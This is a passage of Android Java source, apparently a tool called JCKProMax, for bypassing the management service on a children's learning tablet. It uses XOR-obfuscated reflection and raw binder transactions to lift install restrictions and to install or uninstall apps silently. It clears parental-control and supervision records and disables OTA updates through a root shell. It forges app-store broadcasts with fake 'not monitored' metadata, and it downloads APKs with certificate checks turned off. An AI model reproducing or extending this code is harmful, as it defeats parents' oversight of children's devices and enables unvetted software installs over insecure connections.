            showSnack("未找到文件管理器");
            showManualInstallInput();
        }
    }

    private void showManualInstallInput() {
        final EditText input = new EditText(this);
        input.setText("/storage/emulated/0/");
        input.setHint("输入APK完整路径");

        new AlertDialog.Builder(this)
            .setTitle("输入APK路径")
            .setView(input)
            .setPositiveButton("安装", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    String p = input.getText().toString().trim();
                    if (!p.isEmpty()) {
                        executeInstall(p);
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void executeInstall(final String path) {
        if (!checkAvailable()) return;

        File f = new File(path);
        if (!f.exists()) {
            appendLog("[!] 文件不存在: " + path);
            showSnack("文件不存在");
            return;
        }

        String pkg = f.getName().replace(".apk", "");
        try {
            PackageInfo pi = getPackageManager().getPackageArchiveInfo(path, 0);
            if (pi != null) {
                pkg = pi.packageName;
            }
        } catch (Exception e) { }

        appendLog("[*] 安装: " + f.getName() + " (" + (f.length() / 1024) + "KB)");
        appendLog("[*] 包名: " + pkg);
        final String finalPkg = pkg;

        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean installed = false;

                // ---- 通道1: 解除安装限制（每次安装都执行） ----
                try {
                    Method disableInstall = findMethod(Obfuscator.dec(new byte[]{(byte)0x27, (byte)0x31, (byte)0x20, (byte)0x1d, (byte)0x3a, (byte)0x27, (byte)0x20, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x04, (byte)0x35, (byte)0x37, (byte)0x3f, (byte)0x35, (byte)0x33, (byte)0x31, (byte)0x10, (byte)0x3d, (byte)0x27, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x3b, (byte)0x23}, (byte)0x54), Boolean.TYPE);
                    if (disableInstall != null) {
                        disableInstall.invoke(zybosService, false);
                        appendLog("[+] setInstallPackageDisallow(false)");
                    } else if (zybosBinder != null) {
                        // transact 回退: setInstallPackageDisallow = 0x06
                        Parcel d2 = Parcel.obtain();
                        Parcel r2 = Parcel.obtain();
                        d2.writeInterfaceToken(ZYBOS_DESCRIPTOR);
                        d2.writeInt(0); // false
                        zybosBinder.transact(0x06, d2, r2, 0);
                        r2.readException();
                        appendLog("[+] setInstallPackageDisallow(false) (transact 0x06)");
                        d2.recycle();
                        r2.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("[*] 解除安装限制异常: " + e.getMessage());
                }

                // ---- 通道2: transact 调用 silentInstallApk (0x19) ----
                if (!installed) {
                    try {
                        int code = getTransactCode("silentInstallApk");
                        if (code >= 0 && zybosBinder != null) {
                            Parcel data = Parcel.obtain();
                            Parcel reply = Parcel.obtain();
                            data.writeInterfaceToken(ZYBOS_DESCRIPTOR);
                            data.writeString(path);
                            data.writeInt(1);
                            data.writeString(finalPkg);
                            boolean ok = zybosBinder.transact(code, data, reply, 0);
                            if (ok) {
                                reply.readException();
                                appendLog("[+] silentInstallApk 已调用 (transact 0x" + Integer.toHexString(code) + ")");
                                installed = true;
                            } else {
                                appendLog("[*] transact(0x" + Integer.toHexString(code) + ") 失败");
                            }
                            data.recycle();
                            reply.recycle();
                        }
                    } catch (Throwable e) {
                        appendLog("[*] transact异常: " + e.getMessage());
                    }
                }

                // ---- 通道3: 反射调用 silentInstallApk ----
                if (!installed) {
                    try {
                        Method m = findMethod(Obfuscator.dec(new byte[]{(byte)0xac, (byte)0xb6, (byte)0xb3, (byte)0xba, (byte)0xb1, (byte)0xab, (byte)0x96, (byte)0xb1, (byte)0xac, (byte)0xab, (byte)0xbe, (byte)0xb3, (byte)0xb3, (byte)0x9e, (byte)0xaf, (byte)0xb4}, (byte)0xdf), String.class, Boolean.TYPE, String.class);
                        if (m != null) {
                            m.invoke(zybosService, path, true, finalPkg);
                            appendLog("[+] silentInstallApk 已调用 (反射)");
                            installed = true;
                        } else {
                            appendLog("[!] silentInstallApk 未找到 (transact+反射均失败)");
                        }
                    } catch (Throwable e2) {
                        appendLog("[!] 反射异常: " + e2.getMessage());
                    }
                }

                if (installed) {
                    final String fp = finalPkg;
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("正在安装 " + fp + "..."); }
                    });
                } else {
                    appendLog("[!] 所有安装通道均失败");
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 安装失败 (所有通道)"); }
                    });
                }

                // 检查安装结果
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        new android.os.Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    getPackageManager().getPackageInfo(finalPkg, 0);
                                    appendLog("[+] 安装成功!");
                                    showSnack("✓ 安装成功: " + finalPkg);
                                } catch (Exception e3) {
                                    appendLog("[!] 未检测到安装 (可能仍在后台安装中)");
                                    showSnack("⚠ 安装可能仍在进行中，请稍后查看桌面");
                                }
                            }
                        }, 8000);
                    }
                });
            }
        }).start();
    }

    // ==================== 功能2: 静默卸载 (列表选择+手动+按名称搜索) ====================

    private void doUninstall() {
        if (!checkAvailable()) return;

        new AlertDialog.Builder(this)
            .setTitle("静默卸载")
            .setItems(new String[]{
                "📋 从应用列表选择",
                "✏️ 手动输入应用名/包名"
            }, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int which) {
                    if (which == 0) {
                        showAppListDialog();
                    } else {
                        showManualUninstallDialog();
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void showManualUninstallDialog() {
        final EditText input = new EditText(this);
        input.setHint("输入应用名称（如：微信）或包名");

        new AlertDialog.Builder(this)
            .setTitle("手动卸载")
            .setMessage("输入应用显示名称，自动查找并卸载")
            .setView(input)
            .setPositiveButton("卸载", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    String name = input.getText().toString().trim();
                    if (!name.isEmpty()) {
                        // 先尝试按包名
                        if (name.contains(".")) {
                            silentUninstall(name);
                        } else {
                            searchAndUninstall(name);
                        }
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void searchAndUninstall(final String appName) {
        showSnack("正在搜索: " + appName);
        runAsync(new Runnable() {
            @Override
            public void run() {
                List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
                String foundPkg = null;
                for (PackageInfo pi : packages) {
                    String label = pi.applicationInfo.loadLabel(getPackageManager()).toString();
                    if (label.equalsIgnoreCase(appName) || label.contains(appName)) {
                        foundPkg = pi.packageName;
                        break;
                    }
                }
                if (foundPkg != null) {
                    appendLog("[*] 找到: " + appName + " -> " + foundPkg);
                    silentUninstall(foundPkg);
                    final String fn = appName;
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("正在卸载: " + fn); }
                    });
                } else {
                    appendLog("[!] 未找到应用: " + appName);
                    final String fn2 = appName;
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 未找到应用: " + fn2); }
                    });
                }
            }
        });
    }

    private void showAppListDialog() {
        LinearLayout listContainer = new LinearLayout(this);
        listContainer.setOrientation(LinearLayout.VERTICAL);
        listContainer.setPadding(16, 8, 16, 8);

        final EditText searchBox = new EditText(this);
        searchBox.setHint("搜索应用...");
        searchBox.setSingleLine(true);
        searchBox.setPadding(24, 16, 24, 16);
        listContainer.addView(searchBox);

        final ScrollView scroll = new ScrollView(this);
        final LinearLayout innerList = new LinearLayout(this);
        innerList.setOrientation(LinearLayout.VERTICAL);
        scroll.addView(innerList);
        listContainer.addView(scroll);

        final Set<String> selectedPkgs = new HashSet<>();
        final Map<String, View> itemViews = new LinkedHashMap<>();

        // 加载应用列表
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
                final List<PackageInfo> apps = new ArrayList<>();
                for (PackageInfo pi : packages) {
                    if (!pi.packageName.startsWith("com.android.") || pi.packageName.contains("launcher")) {
                        if (!pi.packageName.equals("android")) {
                            apps.add(pi);
                        }
                    }
                }
                Collections.sort(apps, new Comparator<PackageInfo>() {
                    @Override
                    public int compare(PackageInfo a, PackageInfo b) {
                        return a.applicationInfo.loadLabel(getPackageManager()).toString()
                            .compareToIgnoreCase(b.applicationInfo.loadLabel(getPackageManager()).toString());
                    }
                });

                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        innerList.removeAllViews();
                        for (final PackageInfo pi : apps) {
                            String appName = pi.applicationInfo.loadLabel(getPackageManager()).toString();
                            final String pkgName = pi.packageName;

                            LinearLayout item = new LinearLayout(ZybosToolsActivity.this);
                            item.setOrientation(LinearLayout.HORIZONTAL);
                            item.setPadding(8, 12, 8, 12);
                            item.setGravity(android.view.Gravity.CENTER_VERTICAL);

                            final CheckBox cb = new CheckBox(ZybosToolsActivity.this);
                            item.addView(cb);

                            TextView info = new TextView(ZybosToolsActivity.this);
                            info.setText(appName + "\n" + pkgName);
                            info.setTextSize(12);
                            info.setPadding(16, 0, 0, 0);
                            item.addView(info);

                            item.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View v) {
                                    cb.setChecked(!cb.isChecked());
                                }
                            });

                            cb.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                                @Override
                                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                                    if (!isChecked) {
                                        selectedPkgs.remove(pkgName);
                                    } else {
                                        selectedPkgs.add(pkgName);
                                    }
                                }
                            });

                            innerList.addView(item);
                            itemViews.put(pkgName, item);
                        }

                        // 搜索过滤
                        searchBox.addTextChangedListener(new android.text.TextWatcher() {
                            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) { }
                            @Override public void onTextChanged(CharSequence s, int start, int before, int count) { }
                            @Override
                            public void afterTextChanged(android.text.Editable s) {
                                String query = s.toString().toLowerCase().trim();
                                for (Map.Entry<String, View> entry : itemViews.entrySet()) {
                                    View v = entry.getValue();
                                    TextView tv = (TextView) ((LinearLayout) v).getChildAt(1);
                                    String text = tv.getText().toString().toLowerCase();
                                    boolean match = query.isEmpty() || text.contains(query);
                                    v.setVisibility(match ? View.VISIBLE : View.GONE);
                                }
                            }
                        });
                    }
                });
            }
        }).start();

        new AlertDialog.Builder(this)
            .setTitle("选择要卸载的应用")
            .setView(listContainer)
            .setPositiveButton("卸载选中", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    if (selectedPkgs.isEmpty()) {
                        showSnack("请先选择要卸载的应用");
                        return;
                    }
                    for (String pkg : selectedPkgs) {
                        silentUninstall(pkg);
                    }
                    showSnack("正在卸载 " + selectedPkgs.size() + " 个应用...");
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void silentUninstall(final String pkg) {
        appendLog("[*] 卸载: " + pkg);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Method m = findMethod(Obfuscator.dec(new byte[]{(byte)0x6f, (byte)0x75, (byte)0x70, (byte)0x79, (byte)0x72, (byte)0x68, (byte)0x49, (byte)0x72, (byte)0x75, (byte)0x72, (byte)0x6f, (byte)0x68, (byte)0x7d, (byte)0x70, (byte)0x70, (byte)0x5d, (byte)0x6c, (byte)0x77}, (byte)0x1c), String.class, Boolean.TYPE);
                    if (m != null) {
                        m.invoke(zybosService, pkg, false);
                        appendLog("[+] 卸载调用成功: " + pkg);
                    } else {
                        appendLog("[!] silentUninstallApk 未找到");
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("✗ silentUninstallApk 方法未找到"); }
                        });
                    }
                } catch (Throwable e) {
                    final String err = e.getMessage();
                    appendLog("[!] 卸载失败: " + pkg + " - " + (err != null ? err : e.getClass().getSimpleName()));
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 卸载失败: " + (err != null ? err : "未知错误")); }
                    });
                }
            }
        }).start();
    }

    // ==================== 功能3: 解除管控 (三通道) ====================

    private void doDisableParental() {
        if (!checkAvailable()) return;

        new AlertDialog.Builder(this)
            .setTitle("解除管控 (三通道)")
            .setMessage("将通过三个通道清除所有限制:\n\n" +
                "通道1: ZybosSysApiManager反射\n" +
                "通道2: 云端配置ContentProvider\n" +
                "通道3: SuperviseProvider\n\n" +
                "确定继续?")
            .setPositiveButton("确认解除", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    executeDisableParental();
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void executeDisableParental() {
        appendLog("---------- 解除管控 (三通道) ----------");
        showSnack("正在解除管控...");

        // 在后台线程执行所有反射和ContentProvider操作，避免ANR
        runAsync(new Runnable() {
            @Override
            public void run() {
        // 通道1: ZybosSysApiManager 反射
        appendLog("[*] 通道1: ZybosSysApiManager 反射...");
        tryInvokeDirect(Obfuscator.dec(new byte[]{(byte)0x56, (byte)0x40, (byte)0x51, (byte)0x75, (byte)0x44, (byte)0x46, (byte)0x4e, (byte)0x44, (byte)0x42, (byte)0x40, (byte)0x69, (byte)0x4c, (byte)0x56, (byte)0x51, (byte)0x61, (byte)0x4c, (byte)0x56, (byte)0x44, (byte)0x49, (byte)0x49, (byte)0x4a, (byte)0x52}, (byte)0x25), new Class[]{List.class}, new ArrayList());
        tryInvokeDirect(Obfuscator.dec(new byte[]{(byte)0xed, (byte)0xfb, (byte)0xea, (byte)0xdd, (byte)0xf2, (byte)0xff, (byte)0xed, (byte)0xed, (byte)0xd2, (byte)0xf7, (byte)0xed, (byte)0xea, (byte)0xda, (byte)0xf7, (byte)0xed, (byte)0xff, (byte)0xf2, (byte)0xf2, (byte)0xf1, (byte)0xe9}, (byte)0x9e), new Class[]{List.class}, new ArrayList());
        tryInvokeDirect(Obfuscator.dec(new byte[]{(byte)0x27, (byte)0x31, (byte)0x20, (byte)0x1d, (byte)0x3a, (byte)0x27, (byte)0x20, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x04, (byte)0x35, (byte)0x37, (byte)0x3f, (byte)0x35, (byte)0x33, (byte)0x31, (byte)0x10, (byte)0x3d, (byte)0x27, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x3b, (byte)0x23}, (byte)0x54), new Class[]{Boolean.TYPE}, false);
        tryInvokeDirect(Obfuscator.dec(new byte[]{(byte)0xf5, (byte)0xe3, (byte)0xf2, (byte)0xd3, (byte)0xd5, (byte)0xc4, (byte)0xc2, (byte)0xef, (byte)0xf5, (byte)0xe7, (byte)0xea, (byte)0xea, (byte)0xe9, (byte)0xf1}, (byte)0x86), new Class[]{Boolean.TYPE}, false);
        appendLog("[+] 通道1: ZybosSysApiManager 已调用");

        // 通道2: 云端配置 ContentProvider
        int rows = 0;
        try {
            appendLog("[*] 通道2: 云端配置 ContentProvider...");
            Uri uri = Uri.parse(Obfuscator.dec3(new byte[]{(byte)0x83, (byte)0x80, (byte)0x7c, (byte)0x94, (byte)0x8a, (byte)0x7c, (byte)0x94, (byte)0xd5, (byte)0x3d, (byte)0xcf, (byte)0x8c, (byte)0x7d, (byte)0x8d, (byte)0xc1, (byte)0x68, (byte)0x95, (byte)0x80, (byte)0x6b, (byte)0x85, (byte)0x8d, (byte)0x73, (byte)0x8e, (byte)0x88, (byte)0x3c, (byte)0x89, (byte)0x80, (byte)0x66, (byte)0xce, (byte)0x95, (byte)0x62, (byte)0x94, (byte)0x8c, (byte)0x62, (byte)0x93, (byte)0x8a, (byte)0x60, (byte)0x96, (byte)0x86, (byte)0x71, (byte)0x85, (byte)0xc1, (byte)0x73, (byte)0x83, (byte)0x8c, (byte)0x7d, (byte)0x95, (byte)0x81, (byte)0x66, (byte)0xce, (byte)0x9f, (byte)0x60, (byte)0x8f, (byte)0x99, (byte)0x7b, (byte)0x84, (byte)0x8a, (byte)0x60, (byte)0xcf, (byte)0x8c, (byte)0x7d, (byte)0x8e, (byte)0x89, (byte)0x7b, (byte)0x87}, (byte)0xe0, (byte)0xef, (byte)0x12));
            ContentValues cv = new ContentValues();
            cv.put(Obfuscator.dec(new byte[]{(byte)0x02, (byte)0x0d, (byte)0x00, (byte)0x12, (byte)0x12, (byte)0x3e, (byte)0x07, (byte)0x0e, (byte)0x13, (byte)0x03, (byte)0x08, (byte)0x05, (byte)0x05, (byte)0x04, (byte)0x0f}, (byte)0x61), "");
            cv.put(Obfuscator.dec(new byte[]{(byte)0x16, (byte)0x07, (byte)0x07, (byte)0x28, (byte)0x04, (byte)0x03, (byte)0x16, (byte)0x03, (byte)0x02, (byte)0x04, (byte)0x28, (byte)0x1b, (byte)0x1e, (byte)0x04, (byte)0x03}, (byte)0x77), "");
            cv.put(Obfuscator.dec(new byte[]{(byte)0x3d, (byte)0x3a, (byte)0x39, (byte)0x3c, (byte)0x31, (byte)0x34, (byte)0x2c, (byte)0x26}, (byte)0x55), "");
            cv.put(Obfuscator.dec(new byte[]{(byte)0x55, (byte)0x48, (byte)0x4d, (byte)0x55, (byte)0x7e, (byte)0x44, (byte)0x4f, (byte)0x40, (byte)0x43, (byte)0x4d, (byte)0x44}, (byte)0x21), "0");
            cv.put(Obfuscator.dec(new byte[]{(byte)0x24, (byte)0x28, (byte)0x29, (byte)0x33, (byte)0x26, (byte)0x24, (byte)0x33, (byte)0x18, (byte)0x37, (byte)0x35, (byte)0x28, (byte)0x33, (byte)0x22, (byte)0x24, (byte)0x33}, (byte)0x47), "0");
            cv.put(Obfuscator.dec(new byte[]{(byte)0x89, (byte)0x97, (byte)0x89, (byte)0xa5, (byte)0x99, (byte)0x95, (byte)0x96, (byte)0x96, (byte)0x9f, (byte)0x99, (byte)0x8e, (byte)0x93, (byte)0x95, (byte)0x94}, (byte)0xfa), "0");
            rows = getContentResolver().update(uri, cv, "_id=0", null);
            appendLog("[+] 通道2: 云端配置已清空 (" + rows + " 行)");
        } catch (Exception e) {
            appendLog("[!] 通道2: " + e.getMessage());
        }

        // 通道3: SuperviseProvider
        int spRows = 0;
        try {
            appendLog("[*] 通道3: SuperviseProvider...");
            String[] spPaths = {Obfuscator.dec(new byte[]{(byte)0xe7, (byte)0xac, (byte)0xa1, (byte)0xbb, (byte)0xa9, (byte)0xaa, (byte)0xa4, (byte)0xad}, (byte)0xc8), Obfuscator.dec(new byte[]{(byte)0x4e, (byte)0x0a, (byte)0x04, (byte)0x18, (byte)0x3e, (byte)0x17, (byte)0x00, (byte)0x0d, (byte)0x14, (byte)0x04}, (byte)0x61)};
            for (String path : spPaths) {
                try {
                    Uri spUri = Uri.parse(Obfuscator.dec3(new byte[]{(byte)0xb0, (byte)0xb0, (byte)0x57, (byte)0xa7, (byte)0xba, (byte)0x57, (byte)0xa7, (byte)0xe5, (byte)0x16, (byte)0xfc, (byte)0xbc, (byte)0x56, (byte)0xbe, (byte)0xf1, (byte)0x43, (byte)0xa6, (byte)0xb0, (byte)0x40, (byte)0xb6, (byte)0xbd, (byte)0x58, (byte)0xbd, (byte)0xb8, (byte)0x17, (byte)0xba, (byte)0xb0, (byte)0x4d, (byte)0xfd, (byte)0xaf, (byte)0x58, (byte)0xb7, (byte)0xf1, (byte)0x4a, (byte)0xa6, (byte)0xaf, (byte)0x5c, (byte)0xa1, (byte)0xa9, (byte)0x50, (byte)0xa0, (byte)0xba}, (byte)0xd3, (byte)0xdf, (byte)0x39) + path);
                    ContentValues cv2 = new ContentValues();
                    cv2.put(Obfuscator.dec(new byte[]{(byte)0xc6, (byte)0xcb, (byte)0xd1, (byte)0xc3, (byte)0xc0, (byte)0xce, (byte)0xc7, (byte)0xc6, (byte)0xfd, (byte)0xc3, (byte)0xd2, (byte)0xd2, (byte)0xd1}, (byte)0xa2), "");
                    cv2.put(Obfuscator.dec(new byte[]{(byte)0x90, (byte)0x81, (byte)0x81, (byte)0xae, (byte)0x9d, (byte)0x98, (byte)0x82, (byte)0x85}, (byte)0xf1), "");
                    int r = getContentResolver().delete(spUri, null, null);
                    spRows += r;
                    appendLog("[+] 通道3: " + path + " 删除 " + r + " 行");
                } catch (Exception e2) {
                    appendLog("[!] 通道3 " + path + ": " + e2.getMessage());
                }
            }
        } catch (Exception e3) {
            appendLog("[!] 通道3: " + e3.getMessage());
        }

        appendLog("[*] 解除管控完成 (通道1 ✓, 通道2 " + rows + "行, 通道3 " + spRows + "行)");
        runOnUiThread(new Runnable() {
            @Override public void run() { showSnack("✓ 管控已解除 (三通道)"); }
        });
            }
        });
    }

    // ==================== 功能4: 取消更新 ====================

    private void doCancelUpdate() {
        if (!checkAvailable()) return;

        appendLog("[*] 取消系统更新...");
        runAsync(new Runnable() {
            @Override
            public void run() {
                // 1. 先尝试 transact (事务码 0x1d)
                int code = getTransactCode("cancelUpdate");
                if (code >= 0 && zybosBinder != null) {
                    try {
                        Parcel data = Parcel.obtain();
                        Parcel reply = Parcel.obtain();
                        data.writeInterfaceToken(ZYBOS_DESCRIPTOR);
                        boolean ok = zybosBinder.transact(code, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            appendLog("[+] cancelUpdate 已调用 (transact 0x" + Integer.toHexString(code) + ")");
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✓ 系统更新已取消"); }
                            });
                            data.recycle();
                            reply.recycle();
                            return;
                        }
                        appendLog("[*] transact(" + Integer.toHexString(code) + ") 失败, 尝试反射...");
                        data.recycle();
                        reply.recycle();
                    } catch (Throwable e) {
                        appendLog("[*] transact异常: " + e.getMessage() + ", 尝试反射...");
                    }
                }
                // 2. 回退反射
                try {
                    Method m = findMethod(Obfuscator.dec(new byte[]{(byte)0xa8, (byte)0xaa, (byte)0xa5, (byte)0xa8, (byte)0xae, (byte)0xa7, (byte)0x9e, (byte)0xbb, (byte)0xaf, (byte)0xaa, (byte)0xbf, (byte)0xae}, (byte)0xcb));
                    if (m != null) {
                        m.invoke(zybosService);
                        appendLog("[+] cancelUpdate 已调用 (反射)");
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("✓ 系统更新已取消"); }
                        });
                    } else {
                        // 3. root shell 回退: pm disable OTA包
                        appendLog("[*] 反射也未找到, 尝试root shell...");
                        try {
                            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "pm disable com.zuoyebang.iot.zp.lib.ota.server 2>/dev/null; pm disable com.android.otaprovisioning 2>/dev/null; settings put global ota_disable 1 2>/dev/null"});
                            int exit = p.waitFor();
                            appendLog("[+] cancelUpdate root shell exit=" + exit);
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✓ 已尝试取消更新 (root)"); }
                            });
                        } catch (Throwable e2) {
                            appendLog("[!] cancelUpdate 所有方式均失败");
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✗ 取消更新失败"); }
                            });
                        }
                    }
                } catch (Throwable e) {
                    final String err = e.getMessage();
                    appendLog("[!] 取消更新失败: " + (err != null ? err : e.getClass().getSimpleName()));
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 取消更新失败"); }
                    });
                }
            }
        });
    }

    // ==================== 功能5: 直链安装 (下载+MD5+广播) ====================

    private void doDirectUrlInstall() {
        final EditText input = new EditText(this);
        input.setHint("http://192.168.x.x:8080/app.apk");
        input.setText("https://");

        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(48, 16, 48, 16);

        TextView tip = new TextView(this);
        tip.setText("输入APK直链URL，下载后自动计算MD5并通过广播安装。\n应用名从APK自动解析。");
        tip.setTextSize(11);
        lay.addView(tip);
        lay.addView(input);

        new AlertDialog.Builder(this)
            .setTitle("直链安装 (广播方式)")
            .setView(lay)
            .setPositiveButton("下载安装", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    String url = input.getText().toString().trim();
                    if (!url.isEmpty() && (url.startsWith("http://") || url.startsWith("https://"))) {
                        downloadAndSendBroadcast(url, null, null);
                    } else {
                        showSnack("请输入合法URL");
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void downloadAndSendBroadcast(final String url, final String appName, final String userMd5) {
        appendLog("[*] 直链安装: " + url);
        showSnack("正在下载APK计算MD5...");

        new Thread(new Runnable() {
            @Override
            public void run() {
                File tmpFile = null;
                HttpURLConnection conn = null;
                InputStream in = null;
                FileOutputStream out = null;
                try {
                    File cacheDir = getExternalCacheDir();
                    if (cacheDir == null) cacheDir = getCacheDir();
                    tmpFile = new File(cacheDir, "url_install_" + System.currentTimeMillis() + ".apk");

                    conn = (HttpURLConnection) new URL(url).openConnection();
                    HttpHelper.trustAllCertificates();
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(60000);
                    conn.connect();

                    in = conn.getInputStream();
                    out = new FileOutputStream(tmpFile);
                    byte[] buf = new byte[65536];
                    int n;
                    long total = 0;
                    while ((n = in.read(buf)) > 0) {
                        out.write(buf, 0, n);
                        total += n;
                    }
                    out.flush();
                    appendLog("[+] APK已下载: " + (total / 1024) + "KB");

                    String realMd5;
                    if (userMd5 != null && !userMd5.isEmpty()) {
                        realMd5 = userMd5;
                    } else {
                        realMd5 = computeFileMd5(tmpFile);
                        appendLog("[+] MD5: " + realMd5);
                    }

                    String pkgName = "com.external.apk";
                    String realName = (appName == null || appName.isEmpty()) ? "JCKProMax" : appName;
                    try {
                        PackageInfo pi = getPackageManager().getPackageArchiveInfo(tmpFile.getAbsolutePath(), 0);
                        if (pi != null) {
                            pkgName = pi.packageName;
                            if (appName == null || appName.isEmpty()) {
                                realName = pi.applicationInfo.loadLabel(getPackageManager()).toString();
                            }
                        }
                    } catch (Exception e2) {
                        appendLog("[!] 解析APK信息失败: " + e2.getMessage());
                    }

                    final String finalUrl = url;
                    final String finalPkgName = pkgName;
                    final String finalRealName = realName;
                    final String finalRealMd5 = realMd5;
                    final long finalSize = total;

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            sendAppStoreBroadcast(finalUrl, finalRealMd5, finalRealName, finalPkgName, finalSize);
                            showSnack("正在通过应用商店安装: " + finalRealName);
                        }
                    });

                    // 30秒后清理临时文件
                    final File toDelete = tmpFile;
                    new android.os.Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (toDelete.exists()) {
                                toDelete.delete();
                                appendLog("[*] 临时文件已清理");
                            }
                        }
                    }, 30000);

                } catch (Throwable e) {
                    final String err = e.getMessage();
                    appendLog("[!] 下载失败: " + (err != null ? err : e.getClass().getSimpleName()));
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 下载失败: " + (err != null ? err : "未知错误")); }
                    });
                } finally {
                    try { if (out != null) out.close(); } catch (Exception ignored) { }
                    try { if (in != null) in.close(); } catch (Exception ignored) { }
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }

    private void sendAppStoreBroadcast(String apkUrl, String apkMd5, String apkName, String pkgName, long fileSize) {
        appendLog("[*] 发送appstore直链安装广播...");
        appendLog("[*] URL: " + apkUrl);
        appendLog("[*] 包名: " + pkgName);
        try {
            Random rnd = new Random();
            StringBuilder msgId = new StringBuilder();
            msgId.append(rnd.nextInt(9) + 1);
            for (int i = 0; i < 17; i++) {
                msgId.append(rnd.nextInt(10));
            }

            JSONObject data = new JSONObject();
            data.put("advertisement", 0);
            data.put("advertisementLabel", "无");
            data.put("age", 0);
            data.put("ageLabel", "");
            data.put("apkMd5", apkMd5);
            data.put("apkName", pkgName);
            data.put("apkSize", fileSize > 0 ? fileSize : 32767);
            data.put("apkSizeStr", fileSize > 0 ? formatFileSize(fileSize) : "32767M");
            data.put("apkUrl", apkUrl);
            data.put("apkVersion", "32767");
            data.put("appIdThird", 32767);
            data.put("browseWeb", 0);
            data.put("browseWebLabel", "无");
            data.put("changeLog", "JCKProMax Direct Install");
            data.put("containPayContent", 0);
            data.put("developer", "Unknown");
            data.put("enName", "");
            data.put("entertainment", 0);
            data.put("entertainmentLabel", "无");
            data.put("extraThird", Base64.encodeToString("JCKProMax".getBytes(), 2));
            data.put("from", 1);
            data.put("icon", Obfuscator.dec3(new byte[]{(byte)0x8c, (byte)0xaa, (byte)0x29, (byte)0x94, (byte)0xad, (byte)0x67, (byte)0xcb, (byte)0xf1, (byte)0x2a, (byte)0x93, (byte)0xa9, (byte)0x73, (byte)0x86, (byte)0xb7, (byte)0x2f, (byte)0x87, (byte)0xb6, (byte)0x28, (byte)0x85, (byte)0xf0, (byte)0x3e, (byte)0x8a, (byte)0xf1, (byte)0x29, (byte)0x86, (byte)0xf0, (byte)0x2d, (byte)0x8a, (byte)0xb9}, (byte)0xe4, (byte)0xde, (byte)0x5d));
            data.put("icpNumber", "JCKProMax");
            data.put("id", -(rnd.nextInt(3000) + 1));
            data.put("isCtlWhite", 0);
            data.put("isGreenApp", 1);
            data.put("isMonitored", false);
            data.put("isSensitive", 0);
            data.put("name", apkName);
            data.put("onShelf", 1);
            data.put("payContentLabel", "");
            data.put("permissions", JSONObject.NULL);
            data.put("previewPics", JSONObject.NULL);
            data.put("privacyLink", "");
            data.put("remark", "JCKProMax Direct Install");
            data.put("remoteInstallMsg", "安装 " + apkName + " 中...");
            data.put("risk", 0);
            data.put("statusInPad", 0);
            data.put("summary", apkName);
            data.put("supervise", 1);
            data.put("tags", JSONObject.NULL);
            data.put("type", 1);
            data.put("uploadTime", 32767L);
            data.put("versionCodeThird", 32767);

            JSONObject ipcRequest = new JSONObject();
            ipcRequest.put("pkg_name", Obfuscator.dec2(new byte[]{(byte)0x59, (byte)0xe8, (byte)0x57, (byte)0xa9, (byte)0x40, (byte)0xf2, (byte)0x55, (byte)0xfe, (byte)0x5f, (byte)0xe5, (byte)0x5b, (byte)0xe9, (byte)0x5d, (byte)0xa9, (byte)0x53, (byte)0xe8, (byte)0x4e, (byte)0xa9, (byte)0x4a, (byte)0xe6, (byte)0x5e, (byte)0xa9, (byte)0x5b, (byte)0xf7, (byte)0x4a, (byte)0xf4, (byte)0x4e, (byte)0xe8, (byte)0x48, (byte)0xe2}, (byte)0x3a, (byte)0x87));
            ipcRequest.put("msg_id", msgId.toString());
